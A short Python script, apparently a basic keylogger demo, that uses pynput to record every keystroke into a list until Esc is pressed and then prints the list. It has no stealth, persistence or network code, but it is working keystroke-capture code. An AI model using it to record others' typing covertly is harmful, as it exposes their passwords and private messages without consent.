from pynput import keyboard

def main():
    keylogger_array = []
    def on_press(key):
        if key == keyboard.Key.esc:
            return False
        try:
            k = key.char
        except:
            k = key.name
        keylogger_array.append(str(k))

    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    listener.join()
    print(keylogger_array)

if __name__ == '__main__':
    main()